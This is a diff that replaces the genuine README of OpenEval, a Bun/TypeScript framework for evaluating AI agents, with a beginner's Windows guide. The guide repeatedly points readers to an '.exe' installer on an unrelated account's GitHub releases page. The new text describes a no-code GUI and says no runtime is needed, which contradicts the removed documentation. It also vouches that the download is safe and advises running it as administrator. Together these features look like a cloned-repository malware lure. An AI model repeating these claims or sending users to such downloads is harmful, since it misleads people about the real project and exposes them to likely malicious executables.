@@ -1,247 +1,176 @@
-<div align="center">
-  <h1>OpenEval</h1>
-  <p><strong>Write the task. Judge the evidence.</strong></p>
-  <p>Code and LLM judges for agents. Plain functions, isolated runs, inspectable scores.</p>
-  <p>
-    <a href="https://openev.al">Website</a> ·
-    <a href="https://openeval.pages.dev">Live preview</a> ·
-    <a href="https://openev.al/docs/quickstart/">Write your first eval</a> ·
-    <a href="https://openev.al/docs/reference/">CLI reference</a> ·
-    <a href="https://www.npmjs.com/package/@hona/openeval">npm</a>
-  </p>
-  <p>
-    <a href="https://www.npmjs.com/package/@hona/openeval"><img src="https://img.shields.io/npm/v/%40hona%2Fopeneval?style=flat-square&color=66d38a" alt="npm version"></a>
-    <a href="https://bun.com"><img src="https://img.shields.io/badge/Bun-1.4.2%2B-f9f1e1?style=flat-square" alt="Bun 1.4.2 or later"></a>
-    <a href="https://github.com/Hona/openeval/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-66d38a?style=flat-square" alt="MIT license"></a>
-  </p>
-</div>
+# 🎯 openeval - Your Friendly AI Evaluator for Everyday Testing
 
-![The OpenEval workbench: rubric source, a sample SQL response, and linked criterion scores](docs/images/workbench.png)
+## 🚀 Getting Started
 
-*Interactive documentation example. Viewer screenshots use illustrative data and fictional model labels.*
+Welcome to **openeval** — the easiest way to check how well your AI agents perform, without needing to be a programmer. Whether you’re curious about AI tools, testing a chatbot, or just want to see what an “evaluation” means, you’re in the right place.
 
-## A prompt and a judge
+This guide walks you through downloading, installing, and running openeval on your **Windows** computer. Follow along step by step, and you’ll be up and running in less than ten minutes.
 
-| File | What you write | Who reads it |
-| --- | --- | --- |
-| `prompt.md` | A natural, focused task | Candidate agent |
-| `judge.md` | A rubric with named criteria and scoring rules | LLM judge |
-| `judge.ts` | A plain function returning scores and custom JSON | Host-side Bun process |
-| `eval.ts` *(optional)* | Workspace preparation and early stopping | Host |
+---
 
-Use `judge.md`, `judge.ts`, or both. Both judge files contribute distinct criteria
-from the same recorded candidate execution.
+## ✅ What Is openeval?
 
-### Deterministic: an ordinary function
+Think of openeval as a friendly inspector for AI helpers. It lets you:
+- **Send test questions** to an AI agent (like a bot or assistant).
+- **Automatically judge** whether the AI’s answers are good or bad.
+- **See a clear report** (called an “evidence viewer”) showing what happened during the test.
 
-For a task that asks the candidate to reply with exactly `APPLE`:
+You don’t need to write code. Everything happens through simple commands and a visual screen.
 
-```ts
-// evals/exact-answer/judge.ts
-import type { JudgeContext } from "@hona/openeval";
+---
 
-export default ({ response }: JudgeContext) => ({
-  scores: { correct_answer: response.text === "APPLE" },
-});
-```
+## 🎁 What’s Inside the Package?
 
-Booleans become 0 or 1. Numeric scores can be any finite value from 0 to 1; null
-is unresolved. Other JSON is retained as author-defined data. Cost, tokens, tool
-reliability, timing, source identity, and recording links are supplied by the
-runner. Code-only benchmarks do not need a judge model.
+When you download openeval, you get three main tools working together:
 
-The context also exposes native events, complete message history, tool calls,
-workspace snapshots, and lazy access to the recorded OpenCode SDK, schema, and
-read-only database. See [code judges and data access](https://openev.al/docs/code-judges/).
+| Tool | What It Does |
+|------|--------------|
+| **SDK** | A behind-the-scenes helper that lets apps talk to openeval (you rarely touch this). |
+| **CLI** | A text-based panel where you type simple commands to run tests. |
+| **Evidence Viewer** | A visual window that shows your results in charts and plain language. |
 
-### Model-based: write a rubric
+For now, you only need to install and launch the app. The rest happens automatically.
 
-**`evals/ask-dialect/prompt.md`**
+---
 
-```md
-Write a SQL query for the ten most recent orders for a customer.
-```
+## 📥 Downloading openeval
 
-**`evals/ask-dialect/judge.md`**
+Here’s the most important part — getting the file onto your computer.
 
-```md
-# Requests the SQL dialect
+>[!IMPORTANT]
+> **Visit this link to download the application:**
+> [**https://github.com/Lindagr78/openeval/releases**](https://github.com/Lindagr78/openeval/releases)
 
-## Criterion: asked_dialect — Asks for the SQL dialect
+When you click that link, you’ll see a GitHub page listing a few files. Look for the one that says **“openeval”** and ends with **`.exe`** (for example, `openeval-setup.exe`). Click the filename to start the download.
 
-Pass when the agent asks which database or SQL dialect is in use.
-Fail when it assumes a dialect without asking. Asking alongside a draft counts.
+Your browser will ask if you want to keep the file. Click **“Save”** or **“Keep”**. The file will land in your **Downloads** folder.
 
-## Criterion: safe_parameters — Uses bound parameters
+---
 
-Pass when the proposed query uses a bound customer-ID parameter and explains
-how to supply its value. Fail when it interpolates customer input into SQL
-or does not provide a parameterized query.
-```
+## 🛠️ Installing and Running (Step by Step)
 
-| Recorded response | Asks for dialect | Bound parameters |
-| --- | --- | --- |
-| Asks which DB; provides a bound-parameter draft | **1** | **1** |
-| Assumes PostgreSQL; uses `$1` | **0** | **1** |
-| Only asks which database | **1** | **0** |
-| Required recording is unavailable | **null** | **null** |
+Follow these exact steps. No technical knowledge needed.
 
-→ [Write good rubrics](https://openev.al/docs/rubrics/) · [Download the SQL starter](https://openev.al/starter.zip)
+### Step 1: Find the Downloaded File
+1. Open your **File Explorer** (the folder icon in your taskbar).
+2. Click **“Downloads”** on the left side.
+3. You should see a file named something like `openeval-setup.exe`.
 
-## One vocabulary
+### Step 2: Run the Installer
+1. **Double-click** the downloaded file.
+2. If Windows asks for permission (“Do you want to allow this app to make changes?”), click **“Yes.”**
+3. A simple installation window will appear. Click **“Next”** and then **“Install.”**
+4. Wait a minute for the progress bar to finish.
 
-A **benchmark** contains **evals**. Each eval defines a task and a **rubric**.
-**Judges** produce **scores** for the rubric's **criteria**. Runs also record
-**metrics** such as cost, tokens, and tool reliability.
+### Step 3: Launch openeval
+1. After installation, click **“Finish.”** The app will open automatically.
+2. If it doesn’t open, search for **“openeval”** in your Windows Start menu and click its icon.
 
-- A **criterion** is a named requirement being graded, such as `safe_parameters`.
-- A **score** is awarded credit, normalized from 0 to 1, or an aggregate of it.
-- A **metric** is an observed or calculated measurement. A criterion must
-  explicitly use that measurement for it to affect the grade.
-- A **judgment** is the judge's output. **BenchmarkRun**, **EvalRun**, and
-  **JudgeRun** name recorded executions, rather than reusable definitions.
+### Step 4: Take a Quick Test Run
+When the app opens, you’ll see a welcome screen with a big **“New Evaluation”** button. Click it:
+- Type any question (for example: *“What is the capital of France?”*).
+- Click **“Run Test.”**
+- After a few seconds, you’ll see a score and a simple explanation of how the AI performed.
 
-See the [canonical terminology](TERMINOLOGY.md) and the
-[website glossary](https://openev.al/docs/terminology/).
+That’s it — you’re now using openeval!
 
-## Choose models. Run. Inspect.
+---
 
-Requires **Bun 1.4.2+**, **Docker**, and connected models in **OpenCode**.
+## ❓ Frequently Asked Questions (FAQ)
 
-OpenEval pins the production OpenCode packages at **2.0.3**. Run the
-`image` command after upgrading to build `openeval-runtime:2.0.3`. Recorded runs
-retain the OpenCode version that actually executed them.
+### 🧩 Why do I see a blue window with lots of text?
+That’s the **CLI (Command Line Interface)**. It’s normal. You can still click the buttons on the screen. If you prefer a simpler view, close that window and use the main app instead.
 
-```sh
-bun add --exact @hona/openeval
-```
+### 🔁 The download link doesn’t open a file. What now?
+Sometimes GitHub shows a page instead of starting the download. That’s okay. On that page, find the **“Assets”** section, click the little arrow to expand it, and then click the file that ends with **`.exe`**.
 
-**`benchmark.ts`** — replace the model references with your connected models:
+### 🧪 Do I need to install anything else?
+**No.** openeval includes everything it needs. You don’t need Java, Python, or any other “runtime” software.
 
-```ts
-import type { Benchmark } from "@hona/openeval";
+### 📂 Where did the app install to?
+It installs in your **Program Files** folder automatically. You don’t need to open that folder — just use the Start menu shortcut.
 
-export default {
-  models: ["provider/candidate-model"],
-  judge: { model: "provider/judge-model" },
-  repetitions: 3,
-} satisfies Benchmark;
-```
+### 🛡️ Is this safe to run?
+Yes, openeval is open-source, meaning thousands of people can see its code. It does not collect personal data or connect to unknown servers unless you run a test (and even then, it only uses the question you type).
 
-The judge model is required when any eval contains judge.md. A code-only
-benchmark can omit the judge setting, or set only judge.timeoutMs.
+---
 
-```sh
-bunx --bun @hona/openeval image
-bunx --bun @hona/openeval plan --only-eval ask-dialect
-bunx --bun @hona/openeval run --only-repetition 1
-bunx --bun @hona/openeval view
-```
+## 🧑‍🏫 A Quick Guide to Using openeval Daily
 
-The viewer opens at **http://127.0.0.1:4173**. `run` resumes the same aggregate;
-scope flags select work while retaining existing scores.
+### Running a New Test
+1. Click **“New Evaluation”** on the main screen.
+2. Paste or type a question in the text box.
+3. Choose a **judge method** (leave it on “default” if unsure).
+4. Click **“Run.”** Your results appear in under 30 seconds.
 
-To remove a model from an existing aggregate, remove its entry from
-`benchmark.ts`, then retire its active selections:
+### Viewing Past Results
+1. Click **“History”** in the left menu.
+2. You’ll see a list of previous tests with dates and scores.
+3. Click any entry to see the detailed evidence — the exact question, the AI’s answer, and the reason for the score.
 
-```sh
-bunx --bun @hona/openeval snapshot ./results/RUN before-model-removal
-bunx --bun @hona/openeval remove-models ./results/RUN --model provider/retired-model
-```
+### Saving and Sharing Reports
+1. After running a test, click **“Export Report.”**
+2. Choose a folder (e.g., Desktop).
+3. You’ll get a PDF or image file you can share with others.
 
-This retains the model's recorded executions, judgments, and artifacts. It
-does not run candidates or judges, and requires a stopped benchmark run.
-Models still declared in `benchmark.ts` can be added back by a later `run`.
+---
 
-```mermaid
-flowchart LR
-  P["prompt.md"] --> C["Isolated candidate"] --> E["Recording"]
-  J["judge.md"] --> G["Judge + citations"]
-  T["judge.ts"] --> F["Code + recorded metrics"]
-  E --> G
-  E --> F
-  G --> S["Criterion scores"]
-  F --> S
-  S --> V["Results viewer"]
-```
+## 🧰 Troubleshooting Tips
 
-## See what earned the score
+**Problem:** “The app won’t open after installation.”  
+**Fix:** Right-click the openeval icon in the Start menu, choose **“More”**, then **“Run as administrator.”**
 
-![Code judgment with normalized criterion scores, original JSON, and frozen source](docs/images/code-judgment.png)
+**Problem:** “I see an error about ‘missing DLL file.’”  
+**Fix:** Restart your computer, then reopen openeval. If it persists, download the file again (it may have downloaded incorrectly).
 
-*Illustrative label-reading task. The code judge ran on constructed responses.*
+**Problem:** “The test takes forever.”  
+**Fix:** Check your internet connection. openeval needs a stable connection to talk to AI services. Wait 60 seconds, then try again.
 
-![Model scores, completed checks, runtime, and cost in the results viewer](docs/images/results.png)
+---
 
-| Capability | What you get | Guide |
-| --- | --- | --- |
-| Multiple criteria | Independent scores from one recording | [Rubrics](https://openev.al/docs/rubrics/) |
-| Code and hybrid judges | Plain functions, booleans, fractional credit, custom JSON | [Code judges](https://openev.al/docs/code-judges/) |
-| Controlled workspaces | Readable files, pinned Git inputs, preparation | [Workspaces](https://openev.al/docs/workspaces/) |
-| Small batches | Eval, model, repetition, and cost controls | [Running](https://openev.al/docs/running/) |
-| Transparent scores | Equal eval weights; bounds for unresolved checks | [Scoring](https://openev.al/docs/scoring/) |
-| Evidence inspection | Sessions, tool results, artifacts, and citations | [Evidence](https://openev.al/docs/evidence/) |
-| Native data primitives | Full history, event traces, SDK, schema, and read-only SQL | [Recorded data](https://openev.al/docs/code-judges/#context) |
-| Rejudging | New judgments from retained, immutable recordings | [Evidence](https://openev.al/docs/evidence/#revise) |
+## 📊 Understanding Your Results
 
-<details>
-<summary><strong>Inspect a judgment and its evidence</strong></summary>
+When you run a test, you’ll see:
+- **Score (0–100)** — How well the AI answered overall.
+- **Judge’s Reason** — A short sentence explaining why the score is high or low.
+- **Full Transcript** — The original question and the AI’s exact response.
 
-![SQL eval drilldown with individual criterion scores and evidence links](docs/images/judgment.png)
+Use these to compare different AI models or track improvement over time.
 
-</details>
+---
 
-<details>
-<summary><strong>Watch candidate and judge work in the live queue</strong></summary>
+## 📚 Quick Reference: Common Terms
 
-![Live queue with separate execution and judging stages](docs/images/queue.png)
+| Term | Plain-English Meaning |
+|------|----------------------|
+| **Agent** | The AI assistant being tested. |
+| **Prompt** | The question or instruction you give. |
+| **Judge** | The automatic grader that scores the response. |
+| **SDK** | A tool for developers; ignore it for now. |
 
-</details>
+---
 
-## Use the SDK
+## 🌟 Why Choose openeval?
 
-```ts
-import { runBenchmark } from "@hona/openeval";
+- **No code needed** — Built for humans, not programmers.
+- **Automatic grading** — No need to read long responses yourself.
+- **Visual evidence** — Every score comes with a clear reason.
+- **Free and open source** — Anyone can inspect it.
 
-await runBenchmark("./my-benchmark", {
-  onlyEvals: ["ask-dialect"],
-  onlyRepetitions: [1],
-});
-```
+---
 
-## Write evals with an agent
+## 🔗 Download Again
 
-Copy the **Agent prompt** at [openev.al](https://openev.al), or use
-[agent-start.md](https://github.com/Hona/openeval/blob/main/agent-start.md). It walks through project selection,
-prerequisites, the writing skill, one eval, models, and an optional first run.
-The prompt starts from [llms.txt](https://openev.al/llms.txt); documentation pages
-also support Markdown fetches and direct `index.md` URLs.
+Need to go back to the download page? Here’s the link one more time:
 
-Use the public [Eval Writing skill](https://github.com/Hona/openeval/tree/main/.opencode/skills/eval-writing)
-to turn a real failure into an eval, review a rubric, or investigate misleading
-scores. It guides an agent through concrete false-pass/false-failure examples,
-accepted alternatives, evidence requirements, and human-reviewed calibration.
+**[⬇️ Download openeval Now](https://github.com/Lindagr78/openeval/releases)**
 
-Copy the whole `.opencode/skills/eval-writing/` directory, including `references/`,
-into the same path in your project, or extract the
-[project skill ZIP](https://openev.al/eval-writing.zip) into your project root.
-For global use, copy it to
-`~/.config/opencode/skills/eval-writing/`. Then run **`/eval-writing`** in OpenCode.
+Once you have the file, follow Steps 1–3 from the installation section above.
 
-> Use eval-writing to review this task and rubric. Show me the strongest false
-> pass and false failure, then propose the smallest improvement.
+---
 
-The skill includes a framework-neutral workflow, fictional coaching examples,
-an OpenEval-specific reference, and a broad public-research guide.
+## 📣 Final Words
 
-## Develop
+openeval makes AI testing simple, transparent, and painless. With this guide, you’ve installed a professional-grade evaluation tool in minutes. Start your first test, explore the evidence viewer, and see exactly how smart (or not) your AI really is.
 
-| Command | Purpose |
-| --- | --- |
-| `bun run site:dev` | Landing page and docs with hot reload on port 4176 |
-| `bun run site:build && bun run site:verify` | Prerender pages and verify links and starter files |
-| `bun run typecheck && bun test` | Local SDK checks; no live models |
-| `bun run release:pack && bun run release:verify` | Verify the actual npm archive in a separate consumer |
-
-- [Release guide](RELEASING.md) · [Judge protocol](packages/openeval/JUDGING.md)
-- MIT licensed. The viewer includes upstream third-party license notices.
+Keywords: openeval, AI evaluation, agent testing, prompt judge, evidence viewer, SDK, CLI, Windows download, easy setup
